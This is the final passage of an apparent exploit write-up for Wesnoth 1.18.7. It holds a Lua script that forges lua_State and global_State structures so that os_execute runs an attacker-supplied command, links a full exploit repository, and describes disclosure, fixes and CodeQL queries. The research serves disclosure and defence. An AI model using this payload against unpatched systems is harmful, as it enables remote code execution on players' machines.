We have all the ingredients we need to make this work. The last stretch of effort is to craft our fake `lua_State` object tree within that `textdomain` allocation. To keep it simple and so we only have to reclaim one slot, we can use the address of the slot as the base address for the pointers. We can position each forged struct one after another. Crafting valid pointers into each is easy: take the slot base address, add the offset to the struct. Pad the ending with garbage to get it up to the size class needed.

Below is the annotated implementation of building this tree of fake objects. What each offset represents in the original struct is attached as an inline comment.

### Forged lua_State

```lua
local NUL = string.char(0)

local function p64(n)
    local bytes = ""
    for i = 1, 8 do
        bytes = bytes .. string.char(n % 256)
        n = n // 256
    end
    return bytes
end

local function zeros(n) return string.rep(NUL, n) end

local RNG_UDATA_SZ = profile.rng_size
local TD_STRLEN = RNG_UDATA_SZ - 1

-- Encode a Lua 5.4 short TString node for the forged string table.
local function build_tstring(str, hnext_addr)
    local ts = p64(0)                       -- [+0] next = NULL
    -- [+8] tt=4 (short string), marked=0, extra=0, shrlen
    ts = ts .. string.char(4, 0, 0, string.len(str))
    ts = ts .. string.char(0, 0, 0, 0)      -- [+12] hash = 0
    ts = ts .. p64(hnext_addr)              -- [+16] u.hnext
    ts = ts .. str .. NUL                   -- [+24] contents
    ts = ts .. zeros(32 - string.len(ts))   -- pad to 32 bytes
    return ts
end

local cmd = profile.command
assert(string.len(cmd) <= 71)
local base = target_addr

-- Bytes 0-55: forged name_generator/lua_State overlap.
local core = p64(base + 56)                 -- [0] vtable pointer
    .. p64(0)                               -- [8] padding
    .. p64(base + 152)                      -- [16] L->top
    .. p64(base + 256)                      -- [24] L->l_G -> g
    .. p64(base + 72)                       -- [32] L->ci -> CallInfo
    .. p64(base + 200)                      -- [40] L->stack_last
    .. p64(base + 104)                      -- [48] L->stack

-- Bytes 56-71: forged name_generator vtable.
-- __gc calls the virtual destructor in slot 1, not generate() in slot 0.
    .. p64(0)                               -- [56] vtable[0] = generate
    .. p64(os_execute_addr)                 -- [64] vtable[1] = destructor

-- Bytes 72-103: CallInfo used by Lua to resolve argument 1.
    .. p64(base + 104)                      -- [72] CI.func -> stack[0]
    .. p64(base + 200)                      -- [80] CI.top (3 free slots)
    .. p64(0)                               -- [88] CI.prev = NULL
    .. p64(0)                               -- [96] CI.next = NULL

-- Bytes 104-199: fake stack. stack[1] holds the command.
-- L->top at 152 leaves three slots for results; writes can overlap
-- the command TString at 160 after system() consumes it.
    .. p64(0)                               -- [104] stack[0].value = nil
    .. zeros(8)                             -- [112] stack[0].tt_ = 0
    .. p64(base + 160)                      -- [120] stack[1].value -> TString
    -- [128] stack[1].tt_ = 0x44 (VSHRSTR)
    .. string.char(0x44, 0, 0, 0, 0, 0, 0, 0)
    .. zeros(24)                            -- [136] stack storage through 159

-- Bytes 160 onward initially hold the TString and system() command.
    .. p64(0)                               -- [160] TString.next
    -- [168] tt=4, marked=0, extra=0, shrlen=#cmd, hash=0
    .. string.char(4, 0, 0, string.len(cmd), 0, 0, 0, 0)
    .. p64(0)                               -- [176] TString.u.hnext
    .. cmd .. NUL                           -- [184] command string

-- Pad the command region to the forged global_State base at byte 256.
core = core .. zeros(256 - string.len(core))

-- Bytes 256-1671: fields read through lua_State.l_G while
-- os_execute and luaL_execresult push their results.
--   g+24: GCdebt <= 0 avoids GC through null callbacks
--   g+48: strt.hash -> forged one-bucket string table
--   g+60: strt.size=1 routes lookups to that bucket
--   g+552: 106 cache entries -> valid empty TString
local g = zeros(48)                         -- g+0..47: allocator, GCdebt
    .. p64(base + 1672)                     -- g+48: strt.hash -> bucket
    .. zeros(4)                             -- g+56: strt.nuse = 0
    .. string.char(1, 0, 0, 0)              -- g+60: strt.size = 1
    .. zeros(488)                           -- g+64..551: registry through mt[]
    .. string.rep(p64(base + 1744), 106)    -- g+552: strcache
    .. zeros(16)                            -- g+1400: warnf, ud_warn = 0

-- Bytes 1672-1775: one bucket with short-string nodes for
-- both result labels and the cached empty string.
local extra = p64(base + 1680)              -- bucket[0] -> "exit"
    .. build_tstring("exit", base + 1712)   -- -> "signal"
    .. build_tstring("signal", 0)           -- end of chain
    .. build_tstring("", 0)                 -- strcache target

-- Pad to exactly the textdomain payload size required for allocator reuse.
local payload = core .. g .. extra
payload = payload .. zeros(TD_STRLEN - string.len(payload))
```

## Pop Some Boxes

### Demo

We now have all of our pieces in hand. I suppose it’s time for a demo! The full exploit is available [here](https://github.com/xpcmdshell/wesnoth-1.18-rce)

### Fixes

The initial identified issues were reported to maintainers of the Wesnoth project on August 9th, 2026. Follow up variant analysis with [CodeQL](https://github.com/wesnoth/wesnoth/tree/master/.github/codeql/queries/wesnoth-lua/queries) revealed additional bugs in the same vein, which received remediation. Big thanks to core developers on the project for taking the time to address the findings, and even review some of my PRs. The identified bug variants were fixed across a few versions, wrapped up in 1.19.28.

### Further Learning

The full exploit with offsets for a few platforms is available [here](https://github.com/xpcmdshell/wesnoth-1.18-rce). If you want to explore exploiting Lua bugs further on your own, I’d highly recommend checking out the [CodeQL queries](https://github.com/wesnoth/wesnoth/tree/master/.github/codeql/queries/wesnoth-lua/queries) I contributed to the Wesnoth project to help prevent reintroduction of these bug patterns. Grab an older checkout, such as the version discussed here (1.18.7), run the queries, and poke through the results. You’ll find many more buggy results returned to play with from 1.18.7. I’ve confirmed that each of them is exploitable, some more difficult than others.

The Wesnoth project also has a premade [Docker image](https://hub.docker.com/r/wesnoth/wesnoth/tags?name=2404-sdl3) for builds, which you can use to simplify getting up and running.

All of the variants identified by the CodeQL queries linked are fixed on latest.
